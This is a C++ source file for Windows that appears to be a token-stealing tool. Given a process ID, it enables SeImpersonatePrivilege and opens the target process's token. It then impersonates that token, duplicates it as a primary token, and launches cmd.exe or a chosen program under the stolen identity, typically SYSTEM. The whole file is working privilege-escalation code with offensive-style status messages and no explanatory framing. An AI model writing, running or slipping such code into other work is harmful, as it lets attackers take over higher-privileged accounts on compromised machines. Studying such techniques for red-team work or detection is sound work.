#include <Windows.h>
#include <iostream>

BOOL EnablePrivilege(HANDLE hToken, LPCWSTR pwszPrivilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, pwszPrivilege, &luid))
    {
        std::cout << "[-] LookupPrivilegeValue failed. Error: " << GetLastError() << "\n";
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        std::cout << "[-] AdjustTokenPrivileges failed. Error: " << GetLastError() << "\n";
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        std::cout << "[-] The token does not have the specified privilege.\n";
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char** argv) {
    // Check the arguments
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <Source PID> [Program Path] [Arguments]\n";
        return -1;
    }

    // Get the PID
    char* pid_c = argv[1];
    DWORD systemProcessId = atoi(pid_c);
    LPCWSTR program = L"cmd.exe";
    LPWSTR arguments = NULL;


    // If a second parameter is provided, use it as the program path
    if (argc >= 3) {
        size_t programSize = strlen(argv[2]) + 1;
        wchar_t* wideProgram = new wchar_t[programSize];
        mbstowcs(wideProgram, argv[2], programSize);
        program = wideProgram;
    }

    // If a third parameter is provided, use it as the arguments
    if (argc >= 4) {
        size_t argumentsSize = strlen(argv[3]) + 1;
        wchar_t* wideArguments = new wchar_t[argumentsSize];
        mbstowcs(wideArguments, argv[3], argumentsSize);
        arguments = wideArguments;
    }

    // Open the current process token
    HANDLE hCurrentProcessToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hCurrentProcessToken))
    {
        std::cout << "[-] OpenProcessToken failed. Error: " << GetLastError() << "\n";
        return -1;
    }

    // Enable the specified privilege
    if (EnablePrivilege(hCurrentProcessToken, SE_IMPERSONATE_NAME))
    {
        std::cout << "[+] SeImpersonatePrivilege enabled!\n";
    }

    // Open the token of the target process
    HANDLE hSystemProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, systemProcessId);
    if (!hSystemProcess)
    {
        std::cout << "[-] OpenProcess failed. Error: " << GetLastError() << "\n";
        CloseHandle(hSystemProcess);
        return -1;
    }
    else {
        std::cout << "[+] Process successfully opened!\n";
    }

    // Open the token of the target process
    HANDLE hSystemToken;
    if (!OpenProcessToken(hSystemProcess, MAXIMUM_ALLOWED, &hSystemToken))
    {
        std::cout << "[-] OpenProcessToken failed. Error: " << GetLastError() << "\n";
        CloseHandle(hSystemProcess);
        return -1;
    }
    else {
        std::cout << "[+] New Process Token successfully opened!\n";
    }

    // Impersonate as the logged on user
    if (!ImpersonateLoggedOnUser(hSystemToken))
    {
        std::cout << "[-] ImpersonateLoggedOnUser failed. Error: " << GetLastError() << "\n";
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return -1;
    }
    else {
        std::cout << "[+] Impersonation Successful!\n";
    }

    // Duplicate the token
    HANDLE duplicateTokenHandle = NULL;
    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle))
    {
        std::cout << "[-] DuplicateTokenEx failed. Error: " << GetLastError() << "\n";
        CloseHandle(hSystemToken);
        return -1;
    }
    else {
        std::cout << "[+] Token Duplicated Successfully!\n";
    }

    // Create a new process as the target user
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    if (!CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, program, arguments, CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        std::cout << "[-] CreateProcessWithTokenW failed. Error: " << GetLastError() << "\n";
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return -1;
    }
    else {
        std::cout << "[+] Process started successfully!\n";
    }

    // Close the handles
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);

    // Cleanup allocated memory
    if (argc >= 3) delete[] program;
    if (argc >= 4) delete[] arguments;

    return 0;
}